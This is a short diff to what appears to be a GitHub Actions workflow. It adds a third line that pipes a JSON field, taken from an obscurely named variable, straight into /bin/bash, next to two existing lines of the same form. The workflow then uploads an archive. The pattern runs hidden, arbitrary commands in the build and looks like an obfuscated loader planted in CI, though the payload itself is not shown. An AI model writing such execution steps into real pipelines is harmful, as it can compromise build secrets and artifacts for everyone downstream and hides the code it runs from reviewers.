@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$u930" | jq -r .jyuzh56 | /bin/bash
           echo $bpst201 | jq -r .ic689 | /bin/bash
+          echo $y96 | jq -r .exld4 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
